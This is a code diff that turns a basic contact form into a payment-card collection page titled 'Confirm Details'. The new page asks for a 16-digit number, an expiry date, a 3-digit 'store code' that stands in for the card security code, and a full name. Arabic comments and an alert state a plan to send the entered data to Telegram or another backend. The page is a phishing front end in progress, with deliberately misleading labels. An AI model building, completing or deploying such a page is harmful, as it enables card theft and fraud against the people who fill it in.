@@ -1,23 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Site</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Form</title>
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f5f5f7;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+        sans-serif;
+    }
+
+    .form-card {
+      width: 100%;
+      max-width: 380px;
+      background: #fff;
+      border-radius: 14px;
+      border: 1px solid #e1e1e1;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
+      padding: 22px 20px 24px;
+      box-sizing: border-box;
+    }
+
+    .form-title {
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 14px;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      box-sizing: border-box;
+      padding: 10px 12px;
+      border-radius: 10px;
+      border: 1px solid #d4d4d4;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    input::placeholder {
+      color: #b5b5b5;
+    }
+
+    input:focus {
+      border-color: #111;
+      box-shadow: 0 0 0 1px #11111110;
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .row .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .hint {
+      margin-top: 4px;
+      font-size: 11px;
+      color: #777;
+    }
+
+    button {
+      margin-top: 6px;
+      width: 100%;
+      padding: 11px 12px;
+      border-radius: 10px;
+      border: none;
+      background: #111;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: opacity 0.15s ease, transform 0.08s ease;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .error {
+      margin-top: 6px;
+      font-size: 11px;
+      color: #c00;
+    }
+  </style>
 </head>
-<body style="font-family: Arial; padding: 40px;">
-    <h2>Test Form</h2>
-    <form action="#" method="POST">
-        <label>Name:</label><br>
-        <input type="text" name="name" style="margin-bottom: 10px;"><br>
+<body>
+  <div class="form-card">
+    <div class="form-title">Confirm Details</div>
 
-        <label>Phone:</label><br>
-        <input type="text" name="phone" style="margin-bottom: 10px;"><br>
+    <form id="mainForm" autocomplete="off" novalidate>
+      <!-- Number -->
+      <div class="form-group">
+        <label for="number">Number</label>
+        <input
+          id="number"
+          name="number"
+          type="text"
+          inputmode="numeric"
+          placeholder="XXXX XXXX XXXX XXXX"
+        />
+        <div id="numberError" class="error" style="display:none;">
+          Number لازم يكون 16 رقم.
+        </div>
+      </div>
 
-        <label>Message:</label><br>
-        <textarea name="message" rows="4"></textarea><br><br>
+      <!-- Date + Store code -->
+      <div class="row">
+        <div class="form-group">
+          <label for="expiry">Date</label>
+          <input
+            id="expiry"
+            name="expiry"
+            type="text"
+            inputmode="numeric"
+            placeholder="MM/YY"
+          />
+          <div id="expiryError" class="error" style="display:none;">
+            التاريخ لازم يكون بشكل MM/YY.
+          </div>
+        </div>
 
-        <button type="submit">Send</button>
+        <div class="form-group">
+          <label for="storeCode">كود متجرنا</label>
+          <input
+            id="storeCode"
+            name="storeCode"
+            type="text"
+            inputmode="numeric"
+            placeholder="000"
+          />
+          <div id="storeCodeError" class="error" style="display:none;">
+            الكود لازم يكون 3 أرقام.
+          </div>
+        </div>
+      </div>
+
+      <!-- Name -->
+      <div class="form-group">
+        <label for="fullName">Name</label>
+        <input id="fullName" name="fullName" type="text" />
+        <div class="hint">* Full Name</div>
+      </div>
+
+      <button type="submit" id="confirmBtn">Confirm</button>
     </form>
+  </div>
+
+  <script>
+    const numberInput = document.getElementById("number");
+    const expiryInput = document.getElementById("expiry");
+    const storeCodeInput = document.getElementById("storeCode");
+    const form = document.getElementById("mainForm");
+
+    const numberError = document.
+     getElementById("numberError");
+    const expiryError = document.getElementById("expiryError");
+    const storeCodeError = document.getElementById("storeCodeError");
+
+    // Number: أرقام فقط، 16 رقم، يتقسم بصرياً 4-4-4-4
+    numberInput.addEventListener("input", (e) => {
+      let v = e.target.value.replace(/\D/g, ""); // أرقام فقط
+      if (v.length > 16) v = v.slice(0, 16);
+      // عرض بصري 4 4 4 4
+      e.target.value = v.replace(/(.{4})/g, "$1 ").trim();
+      numberError.style.display = "none";
+    });
+
+    // Date: أرقام فقط، MM/YY مع / تنضاف وحدها
+    expiryInput.addEventListener("input", (e) => {
+      let v = e.target.value.replace(/\D/g, ""); // أرقام فقط
+      if (v.length > 4) v = v.slice(0, 4);
+      if (v.length >= 3) {
+        v = v.slice(0, 2) + "/" + v.slice(2);
+      }
+      e.target.value = v;
+      expiryError.style.display = "none";
+    });
+
+    // كود المتجر: 3 أرقام فقط
+    storeCodeInput.addEventListener("input", (e) => {
+      let v = e.target.value.replace(/\D/g, "");
+      if (v.length > 3) v = v.slice(0, 3);
+      e.target.value = v;
+      storeCodeError.style.display = "none";
+    });
+
+    // فحص قبل الإرسال
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const rawNumber = numberInput.value.replace(/\D/g, "");
+      const rawExpiry = expiryInput.value;
+      const rawStore = storeCodeInput.value.replace(/\D/g, "");
+
+      let ok = true;
+
+      if (rawNumber.length !== 16) {
+        numberError.style.display = "block";
+        ok = false;
+      }
+
+      // لازم يكون الشكل بالضبط MM/YY
+      const expiryRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+      if (!expiryRegex.test(rawExpiry)) {
+        expiryError.style.display = "block";
+        ok = false;
+      }
+
+      if (rawStore.length !== 3) {
+        storeCodeError.style.display = "block";
+        ok = false;
+      }
+
+      if (!ok) return;
+
+      // هنا لاحقاً نحط إرسال البيانات لتليجرام أو أي مكان
+      alert("البيانات Valid. جاهزين نربطها بتليجرام أو أي باك إند.");
+    });
+  </script>
 </body>
-</html>
+</html>   
